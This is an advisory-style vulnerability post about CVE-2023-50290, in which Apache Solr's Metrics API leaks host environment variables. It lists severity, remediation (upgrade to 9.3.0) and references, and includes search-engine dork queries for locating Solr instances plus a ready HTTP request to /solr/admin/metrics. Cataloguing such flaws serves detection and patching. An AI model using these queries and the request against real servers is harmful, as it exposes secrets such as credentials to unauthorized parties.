---
layout: post
cve_id: CVE-2023-50290
title: Apache Solr - Host Environment Variables Leak via Metrics API
pcap: true
pcap_path: /pcaps/2023/CVE-2023-50290.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-50290.yaml
snort2_rule: N/A
snort3_rule: N/A
author: Banana69,DhiyaneshDK
severity: medium
impact: 'This vulnerability can lead to the exposure of sensitive information, potentially
  allowing an attacker to gain unauthorized access or perform further attacks.

  '
remediation: Users are recommended to upgrade to version 9.3.0 or later, in which
  environment variables are not published via the Metrics API.
reference:
- https://solr.apache.org/security.html#cve-2023-50290-apache-solr-allows-read-access-to-host-environment-variables
- https://x.com/sirifu4k1/status/1746755165066236216?s=20
- https://nvd.nist.gov/vuln/detail/CVE-2023-50290
- https://github.com/wy876/POC
- https://github.com/wy876/wiki
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 6.5
  cve-id: CVE-2023-50290
  cwe-id: CWE-200,NVD-CWE-noinfo
  epss-score: 0.92984
  epss-percentile: 0.99767
  cpe: cpe:2.3:a:apache:solr:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: apache
  product: solr
  shodan-query:
  - title:"Apache Solr"
  - http.title:"apache solr"
  - cpe:"cpe:2.3:a:apache:solr"
  - http.title:"solr admin"
  fofa-query:
  - title="solr admin"
  - title="apache solr"
  google-query:
  - intitle:"apache solr"
  - intitle:"solr admin"
tags:
- cve
- cve2023
- apache
- solr
- exposure
- vuln
---

## üîç Vulnerability Description
Exposure of Sensitive Information to an Unauthorized Actor Vulnerability in Apache Solr.
The Solr Metrics API publishes all unprotected environment variables available to each Apache Solr instance. Users can specify which environment variables to hide, however, the default list is designed to work for known secret Java system properties. Environment variables cannot be strictly defined in Solr, like Java system properties can be, and may be set for the entire host,unlike Java system properties which are set per-Java-proccess.


## üåê HTTP Request
```nohighlight
GET /solr/admin/metrics HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

